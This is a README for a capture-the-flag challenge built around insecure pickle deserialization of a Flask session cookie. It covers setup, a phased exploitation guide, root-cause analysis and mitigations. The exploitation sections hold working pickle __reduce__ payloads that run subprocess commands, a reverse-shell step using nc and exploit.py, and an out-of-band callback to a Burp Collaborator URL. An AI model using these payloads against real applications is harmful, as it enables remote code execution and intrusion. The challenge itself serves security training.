# Black Box: Blind OOB Deserialization CTF Challenge

A realistic enterprise-style vulnerability challenge teaching blind Out-of-Band deserialization exploitation through Python pickle attacks.

## Challenge Overview

**Vulnerability**: Insecure Pickle Deserialization with OOB (Out-of-Band) Detection Required  
**Difficulty**: Medium-Hard  
**Category**: Web Security / Code Execution  
**CVE-like Pattern**: Similar to CVE-2023-XXXXX class vulnerabilities

### The Concept

The vulnerable application implements a "secure" session management system using pickle serialization. However, the deserialization happens transparently without validation. Players must:

1. Identify the base64-encoded pickle cookie
2. Confirm RCE capability using Blind OOB techniques (DNS/HTTP callbacks)
3. Escalate to full code execution
4. Extract the flag from `/flag.txt`

## Quick Start

### Local Testing

```bash
# Build and run with Docker
docker-compose up --build

# Access the application
curl http://localhost:5000

# Test exploitation
python3 exploit.py http://localhost:5000 -demo
```

## Application Details

### File Structure

```
.
├── app.py                 # Vulnerable Flask application
├── requirements.txt       # Python dependencies
├── Dockerfile            # Container definition
├── docker-compose.yml    # Orchestration config
├── flag.txt              # Flag file
├── exploit.py            # Player's exploit script
└── README.md            # This file
```

### Key Components

#### The Web Server (app.py)

- **Entry Point**: `GET /` - Initializes session with pickle-serialized UserProfile
- **Session Storage**: Base64-encoded pickle in `enterprise_session` cookie
- **Vulnerability**: Blind `pickle.loads()` on user-controlled input with minimal error handling
- **API Endpoints**:
  - `GET /api/profile` - Returns deserialized user data (confirms RCE)
  - `GET /api/health` - Health check endpoint

#### The UserProfile Class

```python
class UserProfile:
    - user_id (string)
    - username (string) 
    - role (string)
    - metadata (dict)
    - created_at (datetime)
    - last_accessed (datetime)
```

This is the serialized/deserialized object in sessions.

### Deployment

#### Prerequisites
- Docker & Docker Compose
- For local testing: Python 3.11+, Flask, requests module

#### Setup Steps

```bash
# Clone/navigate to challenge directory
cd /path/to/challenge

# Build Docker image
docker build -t blind-oob-ctf .

# Run with compose
docker-compose up -d

# Verify it's running
curl http://localhost:5000
```

#### Configuration

Environment variables (in docker-compose.yml):
- `FLASK_ENV=production` - Disables debug mode
- `PYTHONUNBUFFERED=1` - Real-time log output

## Exploitation Guide

### Phase 1: Reconnaissance

The "tell" is obvious to trained security researchers:

1. Visit `http://localhost:5000`
2. Inspect cookies - notice the long base64 string in `enterprise_session`
3. Try modifying cookie and reload - server returns 500 or hangs slightly
4. This suggests parsing/deserialization logic

### Phase 2: Blind OOB Detection

**Goal**: Confirm RCE without direct response exfiltration

Using Burp Collaborator, RequestBin, or similar:

```bash
# Get your OOB URL
# Example: https://abc123def456.burp.oastify.com

# Generate callback payload
python3 exploit.py http://localhost:5000 -oob https://abc123def456.burp.oastify.com

# Watch for incoming callback in your OOB listener
```

### Phase 3: Full Exploitation

#### Option A: Command Execution via Python

```bash
# Extract flag with curl
python3 exploit.py http://localhost:5000 -curl "cat /flag.txt"

# Or with curl directly (manual method)
curl 'http://localhost:5000' \
  -H "Cookie: enterprise_session=<base64_payload>" \
  --max-time 5
```

#### Option B: Direct Python Script

```python
import pickle
import base64
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (["cat", "/flag.txt"],))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

#### Option C: Using the Provided Exploit Script

```bash
# Establish reverse shell (requires listener)
nc -lvnp 4444 &
python3 exploit.py http://localhost:5000 -shell 192.168.1.100 4444

# Then in the reverse shell:
cat /flag.txt
```

## Vulnerability Analysis

### Root Cause

The vulnerability exists in `app.py`:

```python
def deserialize_session(encoded_session):
    try:
        decoded = base64.b64decode(encoded_session.encode('utf-8'))
        user_profile = pickle.loads(decoded)  # DANGEROUS!
        return user_profile
    except Exception as e:
        logger.error(...)
```

**Why pickle is dangerous**:
- `pickle.loads()` deserializes arbitrary Python code
- An attacker can craft a pickle that executes code during unpickling
- Uses `__reduce__` method or similar hooks for exploitation

### CVSS-like Assessment

- **Attack Vector**: Network (Cookie manipulation)
- **Attack Complexity**: Low (Once deserialization is identified)
- **Required Privileges**: None (Session cookie available to all)
- **User Interaction**: None
- **Impact**: Complete Remote Code Execution

### Mitigation Strategies

1. **Never use pickle for untrusted data** - especially from user input
2. **Use JSON** - Safe serialization format for sessions
3. **Implement signature verification** - HMAC/cryptographic signatures on serialized data
4. **Use established libraries** - Flask session management, SecureCookie, etc.

Example fix:

```python
import json
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
session_data = serializer.loads(cookie_value)  # Safe!
```

## Expected Solve Time

- **Reconnaissance**: 5-10 minutes (finding the cookie and identifying pickle)
- **OOB Confirmation**: 10-15 minutes (setting up callback infrastructure)
- **Full Exploitation**: 5-10 minutes (crafting and delivering payload)
- **Total**: 20-35 minutes for experienced players

## Customization

### Changing the Flag

Edit `flag.txt`:

```bash
echo "CUSTOM_FLAG{your_flag_here}" > flag.txt
```

### Adding Additional Challenges

1. **Cookie signing** - Add HMAC validation to detect tampering earlier
2. **Rate limiting** - Limit request frequency to prevent brute force
3. **WAF rules** - Block obvious base64 patterns
4. **Blind escalation** - Make `/flag.txt` readable only as specific user

### Difficulty Increase

- Remove /api/profile endpoint (confirm only via DNS callback)
- Require specific User-Agent or HTTP header
- Implement timeout/hanging on deserialization errors
- Add decoy payloads that crash the application

## Hints for Players

- The session cookie uses standard encoding (base64) + serialization (pickle)
- Blind OOB techniques help confirm RCE without direct output
- Python's subprocess module can be leveraged via pickle's `__reduce__` method
- Burp Collaborator or similar is essential for blind exploitation

## Debugging

### Application Logs

```bash
docker-compose logs -f web
```

### Testing Session Creation

```bash
curl -v http://localhost:5000 2>&1 | grep -i cookie
```

### Manual Payload Testing

```bash
python3 -c "
import pickle
import base64
import subprocess

class Test:
    def __reduce__(self):
        return (subprocess.Popen, (['id'],))

print(base64.b64encode(pickle.dumps(Test())).decode())
"
```

## References

- [Python Pickle Module](https://docs.python.org/3/library/pickle.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [ysoserial - Java Deserialization Tool](https://github.com/frohoff/ysoserial) (for understanding the concept)
- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#what-can-pickle-do)



**Challenge Created**: 2024  
**Vulnerability Class**: CWE-502 (Deserialization of Untrusted Data)  
**Attack Pattern**: Blind OOB Exploitation (Out-of-Band Callback Detection)
